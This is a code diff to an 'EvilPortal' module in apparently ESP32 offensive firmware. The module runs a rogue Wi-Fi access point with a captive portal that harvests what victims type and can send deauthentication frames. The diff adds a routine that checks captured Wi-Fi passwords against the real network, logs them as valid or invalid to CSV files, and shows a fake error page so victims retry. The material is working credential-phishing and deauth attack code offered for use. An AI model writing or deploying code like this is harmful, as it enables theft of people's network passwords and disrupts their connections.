@@ -4,7 +4,7 @@
 #include "core/mykeyboard.h"
 #include "core/wifi_common.h"
 #include "wifi_atks.h"
-
+#include "esp_wifi.h"
 
 EvilPortal::EvilPortal(String tssid, uint8_t channel, bool deauth) : apName(tssid), _channel(channel), _deauth(deauth), webServer(80) {
     if (!setup()) return;
@@ -56,10 +56,12 @@ bool EvilPortal::setup() {
 }
 
 
+
+
 void EvilPortal::beginAP() {
     drawMainBorderWithTitle("EVIL PORTAL");
     displayTextLine("Starting...");
-
+    // WIFI_MODE_APSTA captive portal takes time to popup so nope...
     WiFi.mode(WIFI_MODE_AP);
     WiFi.softAPConfig(apGateway, apGateway, IPAddress(255, 255, 255, 0));
     WiFi.softAP(apName, emptyString, _channel);
@@ -74,11 +76,62 @@ void EvilPortal::beginAP() {
 }
 
 
+bool EvilPortal::verifyCreds(String &Ssid, String &Password) {
+
+    bool isConnected = false;
+
+    // temporary stop deauth if deauth + clone is true
+    if (_deauth) {
+        temp_stop = true;
+    }
+
+    webServer.stop();
+    wifiDisconnect();
+
+    // STA Mode temporary
+    WiFi.mode(WIFI_MODE_STA);
+
+    delay(80);
+
+    // Try to connect to wifi
+    WiFi.begin(Ssid, Password);
+
+    int i = 1;
+    while (WiFi.status() != WL_CONNECTED) {
+        if (i > 15) {
+          delay(500);
+          break;
+        }
+
+        delay(500);
+        i++;
+    }
+
+    if (WiFi.status() == WL_CONNECTED) {
+        isConnected = true;
+        delay(500);
+        
+    }
+    // re enable
+    if (_deauth) {
+        temp_stop = false;
+    }
+
+    // revert to AP mode 
+
+    WiFi.mode(WIFI_MODE_AP);
+    return isConnected;
+
+}
+
 void EvilPortal::setupRoutes() {
     webServer.on("/", [this]() { portalController(); });
     webServer.on("/post", [this]() { credsController(); });
     webServer.on("/creds", [this]() { webServer.send(200, "text/html", creds_GET()); });
     webServer.on("/ssid", [this]() { webServer.send(200, "text/html", ssid_GET()); });
+
+    // to verify wireless password
+    webServer.on("/verify", [this]() {if (webServer.hasArg("wpassword")) { credsController(true); }; });
 
     webServer.on("/postssid", [this]() {
         if (webServer.hasArg("ssid")) apName = webServer.arg("ssid").c_str();
@@ -92,12 +145,19 @@ void EvilPortal::setupRoutes() {
     });
 }
 
-void EvilPortal::restartWiFi() {
-    webServer.stop();             // Stop Web server
-    wifiDisconnect();             // Disconnect WiFi
-    WiFi.softAP(apName);          // Start Wi-Fi in AP mode with the SSID
-    webServer.begin();            // Start Web server
-    resetCapturedCredentials();   // Reset captured credentials count
+
+void EvilPortal::restartWiFi(bool reset) {
+    webServer.stop();
+    wifiDisconnect();
+    WiFi.softAP(apName);
+    webServer.begin();  
+
+    // code to handle whether to reset the counter..
+
+    if (reset) {
+        resetCapturedCredentials();
+
+    } 
 }
 
 void EvilPortal::resetCapturedCredentials(void) {
@@ -118,7 +178,7 @@ void EvilPortal::resetCapturedCredentials(void) {
         dnsServer.processNextRequest();
         webServer.handleClient();
 
-        if (!isDeauthHeld && (millis() - lastDeauthTime) > 250 && _deauth) {
+        if ((!isDeauthHeld && (millis() - lastDeauthTime) > 250 && _deauth) || (!temp_stop)) {
             send_raw_frame(deauth_frame, 26);  // Sends deauth frames if needed
             lastDeauthTime = millis();
         }
@@ -213,6 +273,10 @@ void EvilPortal::loadCustomHtml() {
     }
 }
 
+String EvilPortal::wifiLoadErrorPage() {
+    PROGMEM String wifiLoad = "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Connection Error</title><style>body, html {margin: 0;padding: 0;height: 100%;font-family: Arial, sans-serif;display: flex;justify-content: center;align-items: center;background-color: #f1f1f1;}.container {text-align: center;padding: 20px;font-size: 24px;color: #000000;border-radius: 8px;background-color: #fff;}.warning-icon {width: 50px;height: 50px;margin-bottom: 20px;}</style><script>setTimeout(function(){window.location='/';}, 5000);</script></head><body><div class='container'><svg class='warning-icon' xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='#e74c3c' stroke-width='2' stroke-lineca='round' stroke-linejoin='round'><path d='M12 2L1 22h22L12 2z'></path><line x1='12' y1='8' x2='12' y2='12'></line><line x1='12' y1='16' x2='12' y2='16'></line></svg><br>Error while connecting to "+apName+"...<br><br>Please try again in <span id='countdown'>5</span> seconds...</div><script>var countdown = 5;setInterval(function(){countdown--;document.getElementById('countdown').innerText = countdown;}, 1000);</script></body></html>";;
+    return wifiLoad;
+}
 
 String EvilPortal::wifiLoadPage() {
     PROGMEM String wifiLoad = "<!DOCTYPE html><html><head> <meta charset='UTF-8'> <meta name='viewport' content='width=device-width, initial-scale=1.0'> </style></head><body> <div class='container'> <div class='logo-container'> <?xml version='1.0' standalone='no'?> <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 20010904//EN' 'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'> </div> <div> <div> <div id='logo' title='Wifi' style='display: flex;justify-content: center;max-width: 50%;margin: auto;'> <svg fill='#000000' height='800px' width='800px' version='1.1' id='Capa_1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' viewBox='0 0 365.892 365.892' xml:space='preserve'> <g> <circle cx='182.945' cy='286.681' r='41.494'/> <path id='p1' d='M182.946,176.029c-35.658,0-69.337,17.345-90.09,46.398c-5.921,8.288-4.001,19.806,4.286,25.726 c3.249,2.321,6.994,3.438,10.704,3.438c5.754,0,11.423-2.686,15.021-7.724c13.846-19.383,36.305-30.954,60.078-30.954 c23.775,0,46.233,11.571,60.077,30.953c5.919,8.286,17.437,10.209,25.726,4.288c8.288-5.92,10.208-17.438,4.288-25.726 C252.285,193.373,218.606,176.029,182.946,176.029z'/> <path id='p2' d='M182.946,106.873c-50.938,0-99.694,21.749-133.77,59.67c-6.807,7.576-6.185,19.236,1.392,26.044 c3.523,3.166,7.929,4.725,12.32,4.725c5.051-0.001,10.082-2.063,13.723-6.116c27.091-30.148,65.849-47.439,106.336-47.439 s79.246,17.291,106.338,47.438c6.808,7.576,18.468,8.198,26.043,1.391c7.576-6.808,8.198-18.468,1.391-26.043 C282.641,128.621,233.883,106.873,182.946,106.873z'/> <path id='p3' d='M360.611,112.293c-47.209-48.092-110.305-74.577-177.665-74.577c-67.357,0-130.453,26.485-177.664,74.579 c-7.135,7.269-7.027,18.944,0.241,26.079c3.59,3.524,8.255,5.282,12.918,5.281c4.776,0,9.551-1.845,13.161-5.522 c40.22-40.971,93.968-63.534,151.344-63.534c57.379,0,111.127,22.563,151.343,63.532c7.136,7.269,18.812,7.376,26.08,0.242 C367.637,131.238,367.745,119.562,360.611,112.293z'/> </g> </svg> </div> </div> </div> </div> <script> const paths = document.querySelectorAll('path'); let index = 0; function showNextPath() { if (index < paths.length) { paths[index].style.display = 'block'; index++; } } function hideAllPaths() { paths.forEach(path => { path.style.display = 'none'; }); index = 0; } hideAllPaths(); setInterval(function() { if (index < paths.length) { showNextPath(); } else { hideAllPaths(); } }, 1000); </script></body></html>";
@@ -237,40 +301,97 @@ void EvilPortal::portalController() {
     }
 }
 
-void EvilPortal::credsController() {
+
+
+
+void EvilPortal::credsController(bool verify) {
     String htmlResponse = "<li>";
+    String passwordValue = "";
     String csvLine = "";
     String key;
-
     lastCred = "";
 
     for (int i = 0; i < webServer.args(); i++) {
         key = webServer.argName(i);
-
-        // Skip irrelevant parameters
+        
         if (key == "q" || key.startsWith("cup2") || key.startsWith("plain") || key == "P1" || key == "P2" || key == "P3" || key == "P4") {
             continue;
         }
+
+        // Special key to trigger verification of Wireless password 
+        if (key == "wpassword") {
+            passwordValue = webServer.arg(i);
+        }
+
 
         // Build HTML and CSV line
         htmlResponse += key + ": " + webServer.arg(i) + "<br>\n";
         if (i > 0) {
             csvLine += ",";
         }
+ 
+        // Skip irrelevant parameters
+
         csvLine += key + ": " + webServer.arg(i);
         lastCred += key.substring(0, 3) + ": " + webServer.arg(i) + "\n";
+        
     }
+
 
     htmlResponse += "</li>\n";
 
-    // Save to CSV and update captured credentials
-    saveToCSV(csvLine);
-    capturedCredentialsHtml = htmlResponse + capturedCredentialsHtml;
-    totalCapturedCredentials++;
+    if (verify) {
 
-    // Send response to the client
-    webServer.send(200, "text/html", wifiLoadPage());
+        // skip more validation for wpassword since it can be done before submition...
+
+        bool isCorrect = verifyCreds(apName, passwordValue);
+        if (isCorrect) {
+
+            // Display valid to screen if valid..
+            lastCred += "valid: true";
+            saveToCSV(csvLine+", valid: true", true);
+            printDeauthStatus(true);
+
+            // save to WiFi creds if the pwd was correct.
+            if (bruceConfig.getWifiPassword(apName) != "") {
+                bruceConfig.addWifiCredential(apName, passwordValue);
+            }
+
+            // stop further actions...
+            wifiDisconnect();
+            wifiConnected = false;
+
+        } else {
+            lastCred += "valid: false";
+            // still save invalid creds...
+
+            saveToCSV(csvLine+", valid: false", true);
+            restartWiFi(false);
+        }
+
+        capturedCredentialsHtml = htmlResponse + capturedCredentialsHtml;
+        totalCapturedCredentials++;
+
+        
+        /*
+            if dosen't work alternative will be: log the MAC who submits the creds
+            then send wifiLoadError if invalid cred..
+        */
+
+        webServer.send(200, "text/html", wifiLoadErrorPage());
+
+    } else {
+        
+        saveToCSV(csvLine);
+        capturedCredentialsHtml = htmlResponse + capturedCredentialsHtml;
+        totalCapturedCredentials++;
+
+         // Send response to the client
+        webServer.send(200, "text/html", wifiLoadPage());
+    }
 }
+
+
 
 String EvilPortal::getHtmlTemplate(String body) {
     PROGMEM String html =
@@ -315,7 +436,7 @@ String EvilPortal::ssid_POST() {
 }
 
 
-void EvilPortal::saveToCSV(const String &csvLine) {
+void EvilPortal::saveToCSV(const String &csvLine, bool isAPname) {
     FS *fs;
     if(!getFsStorage(fs)) {
         log_i("Error getting FS storage");
@@ -323,7 +444,15 @@ void EvilPortal::saveToCSV(const String &csvLine) {
     }
 
     if (!fs->exists("/BruceEvilCreds")) fs->mkdir("/BruceEvilCreds");
-    File file = fs->open("/BruceEvilCreds/"+outputFile, FILE_APPEND);
+
+    File file;
+
+    if (!isAPname) {
+        file = fs->open("/BruceEvilCreds/"+outputFile, FILE_APPEND);
+    } else {
+        file = fs->open("/BruceEvilCreds/"+apName+"_creds.csv", FILE_APPEND);
+    }
+
     if (!file) {
         log_i("Error to open file");
         return;
